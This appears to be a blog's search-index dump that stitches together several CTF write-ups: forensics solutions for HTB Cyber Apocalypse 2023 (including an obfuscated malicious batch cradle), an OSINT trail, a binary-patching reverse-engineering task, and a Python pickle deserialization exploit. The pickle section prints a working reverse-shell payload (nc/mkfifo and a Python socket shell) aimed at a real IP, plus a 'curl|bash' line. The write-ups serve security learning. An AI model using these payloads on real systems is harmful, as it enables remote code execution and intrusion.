Pandora managed to penetrate their defenses and have access to their internal network. Because their server uses HTTP, Pandora captured the network traffic to steal the server’s administrator credentials. Open the provided file using Wireshark, and locate the username and password of the admin.\nCategory: Forensics\nWe are given a network pcap file. Although we can solve this challenge using Wireshark, but to keep it simple for the very first challenge, we will use strings and grep to get the flag.\nHere we use strings to dump out strings from the pcap file, then use pipe (|) and grep to find for strings that match the flag format - HTB{.\nFlag is: HTB{th3s3_4l13ns_st1ll_us3_HTTP}\nAlien Cradle Given file: Get it here!\nDescription: In an attempt for the aliens to find more information about the relic, they launched an attack targeting Pandora’s close friends and partners that may know any secret information about it. During a recent incident believed to be operated by them, Pandora located a weird PowerShell script from the event logs, otherwise called PowerShell cradle. These scripts are usually used to download and execute the next stage of the attack. However, it seems obfuscated, and Pandora cannot understand it. Can you help her deobfuscate it?\nCategory: Forensics\nFor this challenge, we are given a Powershell Script file. In the script, the flag is being concatenated using some Powershell magic lines of code.\nFlag is: HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}\nExtraterrestrial Persistence Given file: Get it here!\nDescription: There is a rumor that aliens have developed a persistence mechanism that is impossible to detect. After investigating her recently compromised Linux server, Pandora found a possible sample of this mechanism. Can you analyze it and find out how they install their persistence?\nCategory: Forensics\nIn this challenge, we are given a shell script to look for the flag. For the sake of understanding the flow of shell scripting, the script checks whether the username is “Pandora” and the hostname is “linux_HQ”. If the check is fulfilled, it starts the process to write the base64 decoded message into the file “/usr/lib/systemd/system/service.service”. The decoded message turned out to contain the flag for our challenge.\nFlag is: HTB{th3s3_4l13nS_4r3_s00000_b4s1c}\nRelic Maps Given file: Get it here!\nDescription: Pandora received an email with a link claiming to have information about the location of the relic and attached ancient city maps, but something seems off about it. Could it be rivals trying to send her off on a distraction? Or worse, could they be trying to hack her systems to get what she knows?Investigate the given attachment and figure out what’s going on and get the flag. The link is to http://relicmaps.htb:/relicmaps.one. The document is still live (relicmaps.htb should resolve to your docker instance).\nNote: This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.\nCategory: Forensics\nFrom the link attached to this challenge, we obtain an Onenote file named “relicmaps.one”. Analyze the file, we get 2 suspicious links, which lead us to 2 different files, http://relicmaps.htb/uploads/soft/topsecret-maps.one and http://relicmaps.htb/get/DdAbds/window.bat.\nI did some analysis on the file “topsecret-maps.one”, and there are only some PNGs inside it. In the “window.bat” file, we are given a Powershell Script. You can run it directly, but I choose to deobfuscate using Python to understand its flow.\ndict = \u0026#34;\u0026#34;\u0026#34; %eFlP%\u0026#34;ualBOGvshk=ws\u0026#34; %eFlP%\u0026#34;PxzdwcSExs= /\u0026#34; %eFlP%\u0026#34;ndjtYQuanY=po\u0026#34; %eFlP%\u0026#34;cHFmSnCqnE=Wi\u0026#34; %eFlP%\u0026#34;CJnGNBkyYp=co\u0026#34; %eFlP%\u0026#34;jaXcJXQMrV=rS\u0026#34; %eFlP%\u0026#34;nwIWiBzpbz=:\\\u0026#34; %eFlP%\u0026#34;xprVJLooVF=Po\u0026#34; %eFlP%\u0026#34;tzMKflzfvX=0\\\u0026#34; %eFlP%\u0026#34;VCWZpprcdE=1.\u0026#34; %eFlP%\u0026#34;XzrrbwrpmM=\\v\u0026#34; %eFlP%\u0026#34;BFTOQBPCju=st\u0026#34; %eFlP%\u0026#34;WmUoySsDby=he\u0026#34; %eFlP%\u0026#34;tHJYExMHlP=rs\u0026#34; %eFlP%\u0026#34;JPfTcZlwxJ=do\u0026#34; %eFlP%\u0026#34;VxroDYJQKR=y \u0026#34; %eFlP%\u0026#34;UBndSzFkbH=py\u0026#34; %eFlP%\u0026#34;KXASGLJNCX=ll\u0026#34; %eFlP%\u0026#34;vlwWETKcZH=em\u0026#34; %eFlP%\u0026#34;OOOxFGwzUd=e\u0026#34;\u0026#34; %eFlP%\u0026#34;NCtxqhhPqI=32\u0026#34; %eFlP%\u0026#34;GOPdPuwuLd=\\W\u0026#34; %eFlP%\u0026#34;XUpMhOyyHB=ex\u0026#34; %eFlP%\u0026#34;cIqyYRJWbQ=we\u0026#34; %eFlP%\u0026#34;kTEDvsZUvn=nd\u0026#34; %eFlP%\u0026#34;XBucLtReBQ=Sy\u0026#34; %eFlP%\u0026#34;JBRccySrUq=ow\u0026#34; %eFlP%\u0026#34;eNOycQnIZD=xe\u0026#34; %eFlP%\u0026#34;chXxviaBCr=we\u0026#34; %eFlP%\u0026#34;YcnfCLfyyS=in\u0026#34; %eFlP%\u0026#34;lYCdEGtlPA=.e\u0026#34; %eFlP%\u0026#34;pMrovuxjjq=he\u0026#34; %eFlP%\u0026#34;UrPeBlCopW=ll\u0026#34; %eFlP%\u0026#34;ujJtlzSIGW= C\u0026#34; %eFlP%\u0026#34;zhNAugCrcK=\u0026#34;%~0.\u0026#34; %eFlP%\u0026#34;ZqjBENExAX=s\\\u0026#34; %VhIy%\u0026#34;dzPrbmmccE=cd\u0026#34; %VhIy%\u0026#34;xQseEVnPet= \u0026#34;%~dp0\u0026#34;\u0026#34; %eUFw%\u0026#34;wxzMwkmbmY=gDBN\u0026#34; %eUFw%\u0026#34;VavtsuhNIN=F\u0026#39;[-\u0026#34; %eUFw%\u0026#34;AHKCuBAkui=r = \u0026#34; %eUFw%\u0026#34;ARecVABHyu=uZOc\u0026#34; %eUFw%\u0026#34;AbZpTpKurz=6] -\u0026#34; %eUFw%\u0026#34;BaMYsIgnsM=$uZO\u0026#34; %eUFw%\u0026#34;JBUgbyTPxp=m(, \u0026#34; %eUFw%\u0026#34;vGOYQQYIpx=.-16\u0026#34; %eUFw%\u0026#34;yPzFwnsYdA= New\u0026#34; %eUFw%\u0026#34;zuIYfGJIhV=O.Me\u0026#34; %eUFw%\u0026#34;gbXeIdPSoj=\u0026#39;[-1\u0026#34; %eUFw%\u0026#34;BqEMjgsfHM=]::(\u0026#34; %eUFw%\u0026#34;bivuMABwCB=Invo\u0026#34; …","date":1679616300,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1679616300,"objectID":"54e93af69745d95c8061dd75971b984c","permalink":"https://blog.bkisc.com/blog/fazect/htb2023-forensics/","publishdate":"2023-03-24T00:10:00Z","relpermalink":"/blog/fazect/htb2023-forensics/","section":"blog","summary":"Short, descriptive write-ups for Forensics challenges I did from the competition.","tags":["ctf","writeup","forensics","cyberapocalypse-2023"],"title":"Cyber Apocalypse 2023: The Cursed Mission - Forensics","type":"blog"},{"authors":["Lê Hoàng"],"categories":null,"content":" Table of Contents Introduction Orbital (easy) Challenge Solution Didactic Octo Paddles (medium) Challenge Solution SpyBug (medium) Challenge Solution TrapTrack (hard) (coming soon) Introduction Welcome to my blog post about the web challenges in the HTB Cyber Apocalypse 2023 competition! For those who may not be familiar, HTB (Hack The Box) is a platform that provides a range of cybersecurity challenges for users to test and improve their skills. Cyber Apocalypse 2023 was a massive virtual event that took place in February 2023, where thousands of participants from all over the world competed in a range of challenges, including web, crypto, reverse engineering, and more.\nWe were able to reach 29th place and solve 60/74 challenges. Particularly for web challenges, we got 8/9 (the one we didn’t solve was Unearthly Shop).\nIn this blog post, I will focus specifically on the web challenges in the Cyber Apocalypse 2023 competition. I will provide a detailed analysis of each challenge, along with my thought process and the techniques I used to solve them. Whether you’re an aspiring cybersecurity professional or a seasoned veteran, I hope you find my write-ups informative and helpful!\nOrbital (easy) Challenge Given file:: Get it here\nDescription: In order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. Can you get your hands on the decoder?\nSolution At first, we were given the login page which requires credentials. There’s nothing else you can do at this point than reading given code.\nUpon given the code, you can find out that there is 1 user “admin” which is initiated at the time the docker is created.

So find my review from the image below and send me an email asking for info. Be creative with the signature so I know its you. It is time to find Who is the killer.\nCategory: OSINT\nFinding the location From the given image, I managed to have found the location on Google Maps at 41.154248, -8.682320.\nThen in the comment section of the location, I got the mentioned secret email, labeled noodlesareramhackers@gmail.com.\nGetting further informations I then sent an email to the email above, and got the next instructions.\nFinding the deleted tweet In the first challenge of the Osint Crime Confusion set (W is for Where), I found the instagram of a person named Heather James.\nThen from this person’s informations, I found the twitter account of University of Dutch ThE of Topics in Science.\nI then immediately knew we have to bring the account to the Wayback Machine to gain access to the deleted tweet. The email did mention about the tweet’s id (1612383535549059076), so we can paste this URL into the Wayback Machine: https://twitter.com/UThE_TS/status/1612383535549059076\nWe successfully gained access to the deleted tweet!\nExploring the killer’s GitHub From the email, we also know that we should continue searching in GitHub. Frankly enough, when I tried to search for “potatoes eating camels” in GitHub, this showed up:\nThe descriptions imply that the person is “still improving wiki”. We then head into the wiki of this repository to find out the end of our journey.\nConcatenate the first letters of the last 7 sentences of the poem, we have our flag for the challenge: idek{JULIANA_APOSIDM723489}.\nConclusion A good OSINT challenge overall, consist of several general skills in the field of OSINT, such as using Wayback Machine or finding locations on Google Maps.\n","date":1673841054,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1673841054,"objectID":"52c028b7047c41e2b3988f4917b783fa","permalink":"https://blog.bkisc.com/blog/fazect/idekctf2022_osintcrime3/","publishdate":"2023-01-16T03:50:54Z","relpermalink":"/blog/fazect/idekctf2022_osintcrime3/","section":"blog","summary":"An in-depth writeup on idekCTF 2022 - Osint/Osint Crime Confusion 3.","tags":["ctf","writeup","osint","idekctf-2022"],"title":"idekCTF 2022 - Osint/Osint Crime Confusion 3: W as in Who","type":"blog"},{"authors":["FazeCT"],"categories":null,"content":" Table of Contents Introduction Static Analysis Reaching case 14 Reaching case 1 Patch the binary Result Introduction Given binary: Get it here!\nDescription: If you can make the program runs faster, you’ll get the flag!\nCategory: Reverse Engineering\nStatic Analysis The challenge provides us with a single binary, named slow.exe. By using IDA Pro or Ghidra or any other kinds of decompiler, we will get the decompiled code.\nAnalyze the main function, we claim that the program initiates an array whose size is 45, then modifies it through some more functions, as shown below.\nint __cdecl main(int argc, const char **argv, const char **envp) { void *Block; // [esp+4h] [ebp-BCh] int v5[45]; // [esp+8h] [ebp-B8h] BYREF v5[0] = 10; v5[1] = -3; ... snip v5[43] = 14; v5[44] = 16; Block = (void *)sub_401AC0(v5, 38, 0); sub_4013B0(Block); sub_401B40(Block); return 0; } The function sub_401AC0(v5, 38, 0) allocates dynamic memory using malloc based on v5 then assigns it into variable Block. That variable is then being passed into function sub_4013B0(Block), which will produce our flag once we have fixed it.\nint __cdecl sub_4013B0(_DWORD *a1) { int result; // eax int v2; // eax int v3; // [esp+4h] [ebp-64h] ... snip int v37; // [esp+64h] [ebp-4h] int v38; // [esp+64h] [ebp-4h] while ( 1 ) { v6 = *(_DWORD *)(a1[1] + 4 * a1[3]++); result = v6 - 1; switch ( v6 ) { case 1: v22 = *(_DWORD *)(a1[2] + 4 * a1[4]--); v26 = *(_DWORD *)(a1[2] + 4 * a1[4]--); v2 = sub_401110(v26, v22); v16 = a1[4] + 1; a1[4] = v16; *(_DWORD *)(a1[2] + 4 * v16) = v2; break; case 2: ... snip case 4: ... snip case 5: ... snip case 6: ... snip case 7: ... snip case 8: ... snip case 9: ... snip case 10: ... snip case 11: ... snip case 12: ... snip case 13: ... snip case 14: v38 = *(_DWORD *)(a1[2] + 4 * a1[4]--); sub_401040(\u0026#34;RESULT: %d\\n\u0026#34;, v38); sub_401260(v38); break; case 15: ... snip case 16: ... snip case 17: ... snip case 18: ... snip default: continue; } } } It is easy to observe that only case 1 and case 14 involve calling other functions.\nTo be more precise, if the program reaches case 1, the function sub_401110(v26, v22) will be called, and on the other hand, if the program reaches case 14, the function sub_401260(v38) will be called. We will talk more about these two functions in the next parts of this blog.\nReaching case 14 As stated earlier, the function sub_401260(v38) will be called if the program reaches case 14, which will be the last part of our code flow.\nint __cdecl sub_401260(char a1) { char v2[256]; // [esp+10h] [ebp-224h] BYREF char Buffer; // [esp+110h] [ebp-124h] BYREF _BYTE v4[3]; // [esp+111h] [ebp-123h] BYREF char v5[32]; // [esp+210h] [ebp-24h] BYREF qmemcpy(v5, \u0026#34;Áõ\u0026#34;, 2); v5[2] = -77; v5[3] = 26; ... snip v5[28] = -66; v5[29] = 63; memset(v2, 0, sizeof(v2)); sub_401D50(\u0026amp;Buffer, \u0026#34;%d\u0026#34;, 55 * a1); sub_401160(v5, v2, 30, \u0026amp;Buffer, \u0026amp;v4[strlen(\u0026amp;Buffer)] - v4); return sub_401040(\u0026#34;flag is: %s\u0026#34;, (char)v2); } The function receives our modified variable Block, then uses it to produce our flag.\nReaching case 1 Here is where things get interesting. Take a look at the function sub_401110(v26, v22), we can conclude that this is why our program runs slowly. The fact that it makes our program sleeps plus it is possibly called many times throughout the process makes our executable runs without any output for a very long time.\nint __cdecl sub_401110(int a1, int a2) { int v3; // [esp+0h] [ebp-4h] v3 = sub_4010F0(0); Sleep(1000 * a1); Sleep(1000 * a2); return sub_4010F0(0) - v3; } The algorithm here is very simple, however this is author’s idea to let the program sleeps for a total of (a1 + a2) seconds each time this function is called. The intended result of this function is to return a1 + a2. We will have to patch the binary to get our flag.\nPatch the binary So we know what makes our program runs slowly, it is time to fix that.

STOP pickle still allows you to define a custom behavior for the pickling process for your class instances.\nThe __reduce__() method takes no argument and shall return either a string or preferably a tuple (the returned object is often referred to as the “reduce value”). […] When a tuple is returned, it must be between two and six items long. Optional items can either be omitted, or None can be provided as their value. The semantics of each item are in order: A callable object that will be called to create the initial version of the object. A tuple of arguments for the callable object. An empty tuple must be given if the callable does not accept any argument. […] So by implementing __reduce__ in a class which instances we are going to pickle, we can give the pickling process a callable plus some arguments to run. While intended for reconstructing objects, we can abuse this for getting our own reverse shell code executed.\nSo if any value in the array pass into pickle.dumps is an instance containing __reduce__(…) function, that reduce will be executed when calling pickle.loads(…). And the __reduce__(…) implement demand returns an tuple with first value an executable, callable method in python for example (os.system, eval or any function), the second value is argument of the callable.\nSo by implement reduce method that return (eval, (\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;curl xxx|bash\u0026#34;)\u0026#39;,)) , we can execute code on the server.\nThe exercise step Generate cookie Add an class definition with __reduce__ method (that return reverse shell python code) to create an instance, then pass the instance to the session1[’name’] that passed into set_cookie.\nclass RCE: def __reduce__(self): # 14.186.174.164 cmd = (\u0026#39;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2\u0026gt;\u0026amp;1 | nc 14.186.174.164 55555 \u0026gt; /tmp/f\u0026#39;) return os.system, ((f\u0026#34;\u0026#34;\u0026#34;python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;14.186.174.164\u0026#34;,55555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;\u0026#34;\u0026#34;\u0026#34;),) # Test @route(\u0026#34;/sign\u0026#34;) def index(): session = request.get_cookie(\u0026#34;name\u0026#34;, secret=sekai) print(session[\u0026#34;name\u0026#34;]) if not session or session[\u0026#34;name\u0026#34;] == \u0026#34;guest\u0026#34;: objWithReduce = RCE() session = …","date":1673481600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1673481600,"objectID":"2256b16fb9515e2dc5aa0a85914de4e5","permalink":"https://blog.bkisc.com/blog/duti/sekai-ctf-2022-bottle-poem/","publishdate":"2023-01-12T00:00:00Z","relpermalink":"/blog/duti/sekai-ctf-2022-bottle-poem/","section":"blog","summary":"Deserialization attack with Python Bottle.","tags":["ctf","writeup","web exploitation"],"title":"Sekai CTF 2022 Bottle Poem","type":"blog"},{"authors":[],"categories":null,"content":" ","date":1666893600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1666893600,"objectID":"8e723f582259e44e14817f259e85b85a","permalink":"https://blog.bkisc.com/event/2022-10-27-hieupc-talk/","publishdate":"2017-01-01T00:00:00Z","relpermalink":"/event/2022-10-27-hieupc-talk/","section":"event","summary":"Anh Ngô Minh Hiếu, hiện là chuyên viên kỹ thuật tại Trung tâm Giám sát và An toàn không gian mạng Quốc gia (NCSC), sẽ có những chia sẻ về kinh nghiệm của bản thân trong việc ngăn chặn các thông tin lừa đảo, giả mạo, không chính thống.
